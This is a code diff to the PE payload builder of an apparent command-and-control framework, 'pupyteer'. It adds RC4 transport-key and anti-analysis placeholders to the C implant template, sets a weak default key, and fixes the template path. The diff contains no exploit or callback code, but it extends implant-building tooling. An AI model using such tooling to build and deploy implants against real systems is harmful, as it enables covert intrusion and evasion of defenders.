@@ -33,7 +33,19 @@ logger = logging.getLogger("pupyteer.payloads.pe_builder")
 # --------------------------------------------------------------------------- #
 #  Template placeholders (defined in pe_template.c)
 # --------------------------------------------------------------------------- #
-TEMPLATE_PLACEHOLDERS = ("{{HOST}}", "{{PORT}}", "{{SLEEP}}", "{{JITTER}}")
+TEMPLATE_PLACEHOLDERS = (
+    "{{HOST}}",
+    "{{PORT}}",
+    "{{SLEEP}}",
+    "{{JITTER}}",
+    "{{RC4KEY}}",
+    "{{ANTI_ANALYSIS}}",
+)
+
+# Default RC4 transport key when the StubConfig does not supply one.
+# 8 hex digits (4 bytes) — deliberately weak by default; operators must set
+# payloads.pe_rc4_key or StubConfig.rc4_key to something real.
+DEFAULT_PE_RC4_KEY = "deadbeef"
 
 # Default MinGW compiler
 DEFAULT_MINGW_PATH = "x86_64-w64-mingw32-gcc"
@@ -215,9 +227,9 @@ class PEBuilder:
     def _load_template(self) -> str:
         """Read the C agent template."""
         if self._template_path is None:
-            # Default: relative to this file
+            # Default: relative to this file (pupyteer/payloads/ -> pupyteer/)
             tpl = (
-                Path(__file__).resolve().parent.parent.parent
+                Path(__file__).resolve().parent.parent
                 / "agent"
                 / "core"
                 / "pe_template.c"
@@ -231,11 +243,20 @@ class PEBuilder:
 
     def _render(self, template: str, cfg: StubConfig) -> str:
         """Replace placeholders in the template with StubConfig values."""
+        # Key precedence: StubConfig.rc4_key > StubConfig.dns_key >
+        # config payloads.pe_rc4_key > built-in default. ConfigManager.get()
+        # returns its default only when the key is genuinely absent, so a
+        # None default cleanly distinguishes "unset" from "set to deadbeef".
+        rc4_key = getattr(cfg, "rc4_key", "") or getattr(cfg, "dns_key", "")
+        if not rc4_key:
+            rc4_key = self._config.get("payloads.pe_rc4_key", None)
         replacements = {
             "{{HOST}}": cfg.host or "127.0.0.1",
             "{{PORT}}": str(cfg.port),
             "{{SLEEP}}": str(cfg.sleep),
             "{{JITTER}}": str(cfg.jitter),
+            "{{RC4KEY}}": rc4_key or DEFAULT_PE_RC4_KEY,
+            "{{ANTI_ANALYSIS}}": "1" if cfg.anti_analysis else "0",
         }
         src = template
         for placeholder, value in replacements.items():
